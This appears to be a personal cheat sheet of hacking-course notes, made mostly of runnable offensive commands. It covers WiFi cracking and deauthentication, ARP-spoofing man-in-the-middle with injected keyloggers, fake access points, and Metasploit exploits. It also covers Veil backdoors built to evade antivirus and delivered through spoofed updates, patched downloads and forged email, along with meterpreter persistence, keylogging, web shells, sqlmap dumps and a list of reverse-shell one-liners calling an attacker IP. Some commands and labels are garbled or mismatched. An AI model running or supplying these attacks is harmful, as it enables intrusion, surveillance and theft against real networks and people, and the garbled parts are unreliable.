# security-commands

## Server side attack

### to change mac(media access control) adress[hw-hardware]

install xarp to prevent ur network from getting hacked or u can use rever dns lookup to check if the ips are valid in ur open port or use sandbox(hybrid-analysis)

`ifconfig <name> down`

`ifconfig <name> hw ether newAddress`

`ifconfig <name> up`

### to change mode from managed to monitor

`ifconfig <name> down`

`airmon-ng check kill`

this command will kill internet connection

`iwconfig <name> mode monitor`

`ifconfig <name> up`

`iwconfig <name>`

or

`iwconfig`

### to capture data in 2.4GHZ

`airodump-ng <name>`

list of networks with their names

### to capture data over 2.4GHZ and 5GHZ

`airodump-ng --band a <name>`

band a is for sniffing in 5GHZ

### to capture data in both 2.4GHZ and 5 GHZ

`airodump-ng --band abg <name>`

### to target a network specify specific mac address(under bssid column) and channel 

`airodump-ng --bssid <bssid> --channed <no> write <filename> <name of wireless adapter in monitor mode>`

### wireshark tool, zenmap tool to analyze data in encrypted output file
`wireshark`

### to disconnect a device from wifi

`airplay-ng --deauth 1000000000 -a  <networkAddress-bssid> -c <clientAddress-station> <wirelessAdapterMonitorMode>`

c : device that needs to be disconnected

a : network that needs to disconnect the device

if it fails then use the command "to target a network specify specific mac address(under bssid column) and channel" first and then try this one

`airodump-ng --bssid <bssid> --channed <no> write <filename> <name of wireless adapter in monitor mode>`

`airplay-ng --deauth 1000000000 -a  <networkAddress-bssid> -c <clientAddress-station> <wirelessAdapterMonitorMode>`

### gaining access wep commands

`airodump-ng --bssid <bssid> --channed <no> write <filename> <name of wireless adapter in monitor mode>`

`aircrack-ng <filename with .cap extension>`

Key Found is the key of the wifi , just remove the colons before using it or you can use the ascii as the wifi password if it is available(ascii field is not always available)

if the network is not busy then #Data is going to be slow, in that case we need to force the AP to generate new packets with new IVs(Initialization vector). for doing this we need to associate with the network , so it won't ignore our request to generate new data packets

`airodump-ng --bssid <bssid> --channed <no> write <filename> <name of wireless adapter in monitor mode>`

`aireplay-ng --fakeauth 0 -a <bssid or mac address> -h <replace the minus in the value of unspeq with colon> <wireless adapter in monitor mode>`

0 is for running the fakeauth command once, -h is for the address of the usb wireless adapter(press ifconfig then in the usb wireless adapter use the value of field unspeq, usually it is the value of ether field, but for running it in monitor mode we will find it in unspeq mode)

`aireplay-ng --arpreplay -b <bssid or mac address> -h <replace the minus in the value of unspeq with colon> <wireless adapter in monitor mode>`

we will run arp attack to inject new packets with new IVs, then my wireless adapter will wait for an arp packet to be sent in the air and my wireless adapter would capture & retansmit the packet, then new packets new IVs... and associate one more time with 

`aireplay-ng --fakeauth 0 -a <bssid or mac address> -h <replace the minus in the value of unspeq with colon> <wireless adapter in monitor mode>`

and then crack the file with

`aircrack-ng <filename with .cap extension>`

### to display all the networks around us which have wps enabled in WPA and WPA2 and get the wifi password

`wash --interface <usb wireless network adapter>`

if the router does not PBC(Push button) then the following commands will work

`aireplay-ng --fakeauth 30 -a <bssid or mac address> -h <replace the minus in the value of unspeq with colon> <wireless adapter in monitor mode>`

we associate with target network every 30 sec.Then we will use reaver to run brute force to get the pin

`reaver --bssid <bssid> --channel <no> --interface <wireless usb adapter> -vvv --n-associate`

-vvv to show us as much info possible, this helps us when things go wrong
--no-associate tells reaver not to associate with target network as we are manually doing it. If this does not work, then use an older version of reaver and check lecture and materials.

wps pin will be visible in the WPS PIN field

### to make a file executable

`chmod +x <filename>`

`./<filename> normal command`

###  to gain access in a WPA2 and get the password

wpa and wpa2 do not send useful data in data packets, they send them in handshake packets, we need to gain access of those packets, we will have to wait for a new client to connect to the network , then we will capture the handshake, instead of this we can use deauth attack

`airodump-ng --bssid <bssid> --channed <no> write <filename> <name of wireless adapter in monitor mode>`

or

`airplay-ng --deauth 4 -a  <network mac Address-bssid> -c <clientAddress-station> <wirelessAdapterMonitorMode>`

we will disconnect the client for a short period , we will send 4 deauth packets. Client will not even notice this.

### creating a word list

`crunch <min> <max> <characters> -t <pattern> -o <filename>`

`man crunch`

other options of crunch present
 
### aircrack-ng will unpack the handshake and extract the useful information

MIC(Message integrity code) will verify if the password is correct or not. for passwords from wordlist we will generate MIC, then it will compare this mic with the mic already present in the handshake  

`aircrack-ng <filename with .cap extension> -w <wordList file>`

check if there is any key found field

to make the process faster you can use gpu instead of cpusudo 

### post accss actions to get data, see all the devices connected to our network

`netdiscover -r <inet range>/24`

-r to specify an ip range to search for

/24 is to specify aole ip range in the subnet which will end with 254

### apple device open ssh key exploitation

`ssh root@<address of apple device in the name scan report from quick scan plus>`

when the apple phone is jailbroken the password is alpine unless the user changes it

### nat network arp attack

run the following command on both target and kali linux

`arp -a`

run the following on kali linux

`arpspoof -i eth0 -t <target ip address> <kali ip from the prev command>`

`arpspoof -i eth0 -t  <kali ip from the prev command> <target ip address>`

for network forwarding

`echo 1> /proc/sys/net/ipv4/ip_forward`

for my machine run the following one as the previous one won't work

`sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'`

### man in the middle attack(mitmf) arp spoofing

`apt-get install mitmf`

`mitmf --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0`

if we do not specify the target it will attack all subnet in the network

-i is for interface

this command will only get http request data, https is more secure, to for intercepting https we need to downgrade https to http, and mitmf does this automatically. mitmf automatically downgrades https connections to http.

### mitmf dns spoofing

first edit the file

`gedit/leafpad /etc/mitmf/mitmf.conf`

then we will finde a records as a records are responsible for transfering/translating domain names to ip address

change *.live.com in a records to my own ip address to redirect any sub domain of live.com to my ip.

then run the following command

`mitmf --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --dns`

### remove and downgrade twisted package to run further mitmf commands

`rm -rf /usr/lib/python2.7/dist-packages/twisted`

`pip install Twisted==15.5.0`

### mitmf plugins

`mitmf --help`

right now there is no way to hack https with hsts

inject js code with --inject , inject key logger with --jskeylogger, take screeshots of loaded page with --screen,for best results go to http pages

`mitmf --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --screen`

thiscommand will take screenshots of every loaded page and --interval denotes the interval between screenshots, go to /var/log/mitmf to see ss

`mitmf --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --screen --interval <interval>`

`mitmf --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --jskeylogger`

the above command captures every letter that the target machine types

### mitmf injection

we can either inject js/html code , code can be stored in a --js-file / --html-file or stored online --js-url / --html-url or supplied through command line --js-payload / --html-payload, this method is not 100% reliable for https websites, python programming needs to be done in that case

`mitmf  --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --inject --js-payload "<js code>"`

`mitmf --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --inject --js-payload "alert('test')"`

`mitmf  --arp --spoof --gateway <gateway ip> --target <target ip> -i eth0 --inject --js-file <filepath >`

### mana-toolkit / mana tool commands for creating fake access point

`apt-et install mana-toolkit`

`start-noupstream.sh`

this command starts fake AP with no internet access, never use this one

`start-nat-simple.sh`

this command starts fake AP with internet access, use this one

`start-nat-full.sh`

starts fake AP with internet access, and automatically starts sniffing data, bypass http, this fails sometimes

edit mana settings file

`gedit/leafpad /etc/mana-toolkit/hostapd-mama.conf`

change the interface to the interface(wireless) u want to broadcast the signal and ssis to Internet , ssid is the fake access point name
rlogin -l 
edit the start script of the mana-toolkit

`gedit /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`

edit upstream to my nat network interface and phy to the network which will broadcast the network(wireless adapter)

`bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`

if the command fails, run the command again, hopefully it will run

### metasploitable 512 tcp port netkit-rsh info gathering

`apt-get install rsh-client`

`rlogin --help`

`rlogin -l root <target ip>`

### metasploiutable 21 tcp vsftpd v2.3.4 info gathering with back door

search - vsftpd 2.3.4 exploits

`msfconsole`

runs the metasploitable console

`help`

shows help

`show <something>`

something can be exploits, payloads, auxiliaries or options

`use <something>`

use a certain exploit, payload or auxiliary

`set <option> <value>`

configure option to have a value

`exploit`

runs the current task

for exploitation run following commands

`msfconsole`

`use exploit/unix/ftp/vsftpd_234_backdoor`

`show options`

`set RHOST <ip of target>`

prev commands connect to the back door

`show options`

`exploit`

run again if the last command fails

### metasploiutable 139 tcp metbios-ssn samba smbd 3.X info gathering with back door

`chmod +x`

search - metbios-ssn samba smbd 3.X exploits

`msfconsole`

`use exploit/multi/samba/usermap_script`

`show options`

show options will give different output for different exploits

`set RHOST <ip of target>`

`show options`

`show payloads`

`set PAYLOAD cmd/unix/reverse_netcat`

`show options`

`set LHOST <host ip>`

`show options`

`set lport <host listening port>`

host listening port can be anything

`show options\`

`exploit`\

### metasploitable gui

`chmod +x <installer file name>`

`./<installer file name>`

`service metasploit start`

### nexpose tool gui

`service postgresql stop`

`chmod +x <installer file name>`

`./<installer file name>`

`service postgresql stop`

watch the 10th video of 10th folder

## Client side attack

### veil 

`./Veil.py`

evasion generates undetectable backdoors. ordnance generates payloads which is used by evasion. helper or secondary tool of evasion. Payload is the part of the code of the backdoor that does the evil stuff.

`use 1`

run the above command for doing evasion.

`list`

we will now use go/meterpreter/rev_https.py, this is designed in go language and meterpreter is designed by metasploit, meterpreter runs ion the memory,This payload doesnot leave footprint. Third part is a method to establish connection. rev is reverse,this payload would create reverse httpconnection.The connection would come from the target computer. The backdoor would connect back to me from the target computer.

`use <the # of go/meterpreter/rev_https.py>`

LHOST is the ip where the payload/backdoor would try to connect.

`ifconfig`

`set LHOST <ip of the attacker machine>`

to change the port of the LHOST which is LPORT, run the following command

`set LPORT <the value of the port>`

`options`

it will bypass every antivirus program except avg. but we want to byass everything. antivirus has very large database of signatures. these signatures contain the files with harmful code.So they compare your backdoor with all the files in the db.If your file matches any of the files , then they will falg it as a virus/malware. If it does not match , then they will think it is a normal file.  we nedd to modify our backdoor file to make it more unique, so that it bypasses signature db and bypass antivirus program. Tp bypass avg, We are going to set some optional options, they will just make the backdoor look a bit different. set processor value, not a large value, if we set a large value then our processor might not work. sleep option let the backdoor sleep for a number of seconds before it exectes the evil code/payload.

`set PROCESSORS 1`

`set SLEEP 6 `

`options`

generate the backdoor with following command

`generate`

name the backdoor after running the above command, copy the address where the backdoor is stored(executable written to value)

virus total shares the scanning result with antivirus, so donot use that. use no distribute and scan the file.

update veil. antivirus updates always and veil too. so we need to update veil to get better results. we need to play around with payloads and options to bypass all antivirus.

the backdoor does not create a port in target machine, it actually connects from the target computer to our computer.By doing that it will bypass firewall an look less suspicious. for that we need to open a port in our computer. meterpreteris programmed by the people who made metasploit. that's why we are using metasploit to listen to that connection

`msfconsole`

to listen to incoming connection run the following command

`use exploit/multi/handler`

`show options`

now we will see that in payload options our target is windows, which is correct, but we are running meterpreter reverse http not reverse tcp, so we nned to change this.

`set PAYLOAD windows/meterpreter/reverse_https`

this payload should correspond to the payload that you choose in the backdoor.

`show options`

`exploit`

to make sure that it works, we are goin to use basic delivery method.watch 11folder video6. kali linux website /var/www/html, here website files are stored.copy the backdoor file and paste it here in a folder. to start kali web serve, run the following command

`service apache2 start`
 
go to website from windows machine and browse the file location. you will see the file. run the following in kali meterpreter console and it will show the system info of the target machine

`sysinfo`

### smart delivery method after downloading and installing evilgrade

starting evilgrade

`./configure`

checking programs that can be hijacked

`show modules`

selecting one

`configure <module>`

setting backdoor location

`set agent <agent location>`

starting server

`start`

start dns spoofing and handler

to run evilgrade , run the following
 
`./evilgrade`

`show modules`

`configure <modulname in our case : dap>`

show options in dap

`show options`

`set agent /var/www/html/backdoor.exe`

`show options`

you might want to change endsite, this is the site that will be displayed after update successful, we can change it to any website

`start`

our backdoor will serve as an update , we will redirect any update request to virtualHost option value. start spoofing

edit mitmf.conf, change dns port if the dns port matches with the port of the evilgrade, in a records we will see that we are redirectiong any request from update.speedbit.com to our own ip 

`mitmf --arp --spoof --gateway <host ip> --target <target ip> -i <interface name> --dns`

--dns is for dns spoofing

`show options`

`exploit`

go to target and update it, then we will get a meterpreter session, where we can run the folllowing

`sysinfo`

### another backdoor delivery method using bdfproxy tool

in this method we will wait for the target machine to download something. then our backdoor will automatically start downloading

setting ip address in config, set up the proxy mode to transparent, so the other person would have interet connection and change the ip address, everywhere you see host, you should change the ip address

`gedit/leafpad /etc/bdfproxy/bdfproxy.cfg`

starting bdfproxy, resource written to is the file where we can listen to the all the incoming connections

`bdfproxy`

redirecting traffic to bdfproxy, redirect any connection from 80 port to port 8080

`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 8080`

starting arp spoofing

`mitmf --arp --spoof -i <interface> --gateway <gateway ip> --targets <target ip>`

start listening for connections

`msfconsole -r /usr/share/bdfproxy/bdf_proxy_msf_resource.rc`

now go to the target machine and download and install sthng. then we will get a new meterpreter session, we can interact with the session by running 

`session -i <# of the session, in this case 1>`

`sysinfo`

when done reset ip tables rules

`./flushiptables.sh`

### winmd5 

download winmd5 to check if a file signature has changed

### maltego tool

see 12th folder video

if your backdoor is a image or pdf u would want remove .exe from it after processing it.

`sendmail -s <server:port> -xu <username> -xp <password> -f "<from email>" -t "<to email>" -u "<subject of the email>" -m "<message body insert backdoor file link>" -o message-header="From:<from name of the person or the company> <from mail name also put angular brackets before and after email address>"`

### beef  tool

`mitmf --arp --spoof --gateway <gateway ip> --targets <target ip> -i <interface name> --inject --js-url <url of the hook>`

watch 12th folder vuideoes


### veil-evasion tool using public ip

`veil-evasion`

`list`

we will use cs/meterpreter/rev_http

`use <# of cs/meterpreter/rev_http>`

`set LHOST <what's my ip search google u'll get public ip>`

`info`

`generate`

copy execute written to link ath and paste it to /var/www/html and listen on the loacl ip using following command

`msfconsole`

`use exploit/multi/handler`

`set PAYLOAD windows/meterpreter/reverse_http`

`set LPORT 8080`

`set LHOST <ifconfig ip>`

`show options`

`exploit`

usually router is the first one in the subnet or you can run the following command to get the private ip of the router

`route -n`

go to router private ip and then select forwarding and set public and target port to 8080 and 80 and target ip address to attackers ip address. we set another port forwarding as our backdoor file is in /var/www/html

`service apache2 start`

### beef tool with another network

copy the script and paste it in the /var/www/html with public ip

beef uses port 3000 , so we would configure our router to forward port 3000, or u can set kali machien as dmz host , it forwards ll ports, not all routers support dmz hosting

### after gaining access to the meterpreteression

`help`

`background`

background is similar to minimizing a window,it won't terminate the session, then you will be able to run other metasploit exploits, to see all the sessions we can run

`sessions -l`

interact with a session

`sessions -i <id of the session which we will get after running sessions -l>`

to see information about the target computer

`sysinfo`

it will show all the interfaces on the target computer

`ipconfig`

it will list all the processes that are running in the target computer

`ps`

you can migrate to a safer process id to target computer using the following command, this will migrate the current session to the safer process id

`migrate <pid of the safer process running in the target>`

shows current working directory

`pwd`

lists files in the current working directory

`ls`

changes working directory to location

`cd <location>`

prints the content of file on screen

`cat <file>`

downloads file

`download <file>`

uploads file

`upload <file>`

executes file

`execute -f <file>`

converts meterpreter session to command shell

`shell`

`help`

veil evasion does not always work

using persistence modulen in meterpreter console, but it is detectable by antivirus

`run persistence -h`

`run persistence -U -i <interval> -p <port> -r <attacker ip>`

-u for user previlege

### using metasploit + veil-evasion

continuing from the previous option, this is more robust and udetectable by antivirus

`use exploit/windows/local/persistence`

`set session <session id>`

`set exe::custom <backdoor location>`

`exploit`

start doing the operation 

`use exploit/windows/local/persistence`

`show options`

`set EXE_NAME browser.exe`

`set session <session id>`

`show options`

every module has advanced option , to see the advanced options of that particular module run 

`show advanced`

`set EXE::Custom <backdoor location>`

`show advanced`

`exploit`

`sessions -l`

`sessions -K`

`use exploit/multi/handler`

`show options`

`exploit`

### logging all mouse/keyboard events

shows current working directory

`keyscan_start`

lists fils in the current working directory

`keyscan_dump`

changes working directory to location

`keyscan_stop`

taking screenshot of the target computer

`screenshot`

### pivoting

use the hacked device as a pivot, then try to gain access to other devices in the network, three machines work here - attacker, hacked, target

### using auto route for pivoting

for using it

`use post/windows/manage/autoroute`

set subnet of target network

`set subnet <subnet>`

set session id

`set session <id>`

exploit

`exploit`

start running commands

`use exploit/multi/samba/usermap_script`

`show options`

`set RHOST <ip of the target>`

`show payloads`

`set PAYLOAD cmd/unix/bind_metcat`

`shows options`

`exploit`

this exploit will timeout as our attacker can not see this ip, the following two commands will show us the info of the hacked machine

`sessions -i <session id>`

`ifconfig`

`background`

`use post/windows/manage/autoroute`

to see all the manage modules , run the following

`use post/windows/manage[press double tab]`

`show options`

`set session <id>`

`set subnet <subnet- ip of the target with .0 as the fourth subsection of the ip>`

`exploit`

`use exploit/multi/samba/usermap_script`

`show options`

`exploit`

### whois lookup 

go to whois.domaintools.com lookup website to gather information, find info about the owner of the target

### netcraft site report

go to toolbar.netcraft.com/site_repot?url= , it shows technologies used on the target

### robtex dns lookup

go to robtex.com , it shows comprehensive info about the target website

### exploit database

go to exploit-db.com to search for possible exploits

### names pointing to the same 

we can either use robtex shared names pointing to same ip or go to bing and google for ip:targetIP

### knock for sub domains

download knock from github and run it

`pyhton knock.py <target domain name>`

### drib tool

frib tool helps to find files and directories in target website 

`drib <target web site address> <wordlist directory> <options>`

withput options

`drib <target web site address> <wordlist directory>`

default wordlist

`drib <target web site address>`

for more info run

`man drib`

### file upload vulnerability using weevly tool

generating backdoor

`weevly generate <password> <filename and url/ directory to save the file>`

then upload generated file and connect to it

`weevly <url to file> <password>`

find out how to use weevly

`help`

The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.
Therefore in all f these cases you need to listen for port 8080 using the foolowing command

`nc -vv -l -p 8080`

nc-> netcat , vv-> verbose output

BASH

`bash -i >& /dev/tcp/10.20.14.203/8080 0>&1`

PERL

`perl -e 'use Socket;$i="10.20.14";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.14",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

PHP

`php -r '$sock=fsockopen("10.20.14",8080);exec("/bin/sh -i <&3 >&3 2>&3");'`

Ruby

`ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

Netcat

`nc -e /bin/sh 10.20.14 8080`

### local file inclusion

this allows an attacker to read any file on the server and access files outside www directory

### remote file inclusion

similar to local file inclusion, but allows an attacker read any file from server, execute php files from other servers on the current server, store php files on other sources as .txt, we need to enable the fucntion that converts local file inclusion to remote file inclusion

### prevent file upload, code execution and file inclusion vulnerabilities

file upload - only allow safe files to be uploaded

code execution - don't use dangerous functions or filter user input before execution

file inclusion - disable allow_url_fopen and allow_url_inlude, use static file inclusion

### SQL injection

`mysql -u root -h <target ip>`

for using a db

`use <dbname>`

`show tables;`

`select * from <tablename>`

### sqlmap tool

it will check if the target is sql injectable

`sqlmap -u <target url/>`

use help command to see how u can get info from sql map

`sqlmap --help`

get current databases

`sqlmap -u <target url/> --dbs`

get current user

`sqlmap -u <target url/> --current-user`

get current db

`sqlmap -u <target url/> --current-db`

get tables for a db

`sqlmap -u <target url/> --tables -D <dbname>`

columns of the table

`sqlmap -u <target url/> --columns -T <tablename> -D <dbname>`

get data of that table

`sqlmap -u <target url/> -T <tablename> -D <dbname> --dump`

### dvwa tool to practice hacking

watch videoes

### discover vulnerabilities using zap tool

watch 20 th folder videoes
